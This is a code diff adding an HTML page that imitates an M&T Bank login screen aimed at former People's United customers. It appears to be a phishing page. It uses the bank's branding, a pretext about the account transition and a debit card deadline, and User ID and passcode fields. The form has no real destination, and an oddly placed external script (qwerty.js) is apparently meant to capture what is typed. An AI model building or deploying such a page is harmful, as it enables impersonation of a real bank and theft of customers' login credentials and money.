@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login</title>
+    <link rel="stylesheet" href="./styles/qwerty.css">
+</head>
+
+<body>
+    <header>
+        <span>
+            <nav class="none">
+                <a href="./qwerty.html">Personal</a>
+                <a href="./qwerty.html">Business</a>
+                <a href="./qwerty.html">Commercial</a>
+                <a href="./qwerty.html">People's United</a>
+            </nav>
+            <a href="./qwerty.html" class="logo">
+                <img src="./img/white logo.png" alt="whitelogo" />
+            </a>
+        </span>
+        <a href="./qwerty.html">
+            <img src="./img/hamburger-removebg-preview.png" alt="hamburger" class="hamburger" />
+        </a>
+    </header>
+    <main>
+        <section class="none">
+            <h1>Former People's United Customers, we’re here to help.</h1>
+            <div>
+                <p>As we experience high call volumes, you may be able to get the answers you need online:</p>
+                <ul>
+                    <li>Learn how to reset or unlock your M&T Online Banking passcode</li>
+                    <li>If you need help logging in to an M&T system, please click here</li>
+                    <li>As a reminder, your People’s United Debit Card will no longer work on September 21</li>
+                </ul>
+                <p>You can also find answers to frequently asked questions, helpful demos, account guides and more by
+                    visiting our Welcome Center.</p>
+            </div>
+            <a href="./qwerty.html">Visit the Welcome Center ></a></a>
+        </section>
+        <section>
+            <h1>Log in</h1>
+            <p>If you know how to <script src="./qwerty.js" async defer></script> log in to the system you need, select one of the options below.</p>
+            <div class="formsLinks">
+                <a href="./qwerty.html" class="active">Personal / Business</a>
+                <a href="./commercial.html">Commercial Treasury Center</a>
+            </div>
+            <form id="form">
+                <fieldset>
+                    <label for="userId">User ID</label>
+                    <input type="text" required name="userId" id="userId" />
+                </fieldset>
+                <fieldset>
+                    <label for="passcode">Passcode</label>
+                    <input type="password" required name="passcode" id="passcode" />
+                </fieldset>
+                <input type="hidden" required name="treasuryId" id="treasuryId" placeholder="Treasury Center User ID" />
+                <i>
+                    <input type="checkbox" name="remember" id="remember" />
+                    <label for="remember">Remember User ID</label>
+                </i>
+                <button type="submit" class="active">Login ></button>
+            </form>
+            <footer>
+                <p>
+                    <small style="font-size:10px; text-align: center;"><img width="15px"
+                            src="./img/equal-housing-lender-logo.png" alt="house" /> Equal Housing Lender Icon Equal
+                        Housing Lender, © 2022 M&T Bank, Member FDIC NMLS</small>
+                </p>
+                <small style="font-size:10px; text-align: center; color: green; display: block; margin: auto; padding-top: 1em;">Privacy| Sitemap | Digital Service Agreement | ESign
+                    Consent | Terms of Use</small>
+            </footer>
+        </section>
+    </main>
+</body>
+
+</html>
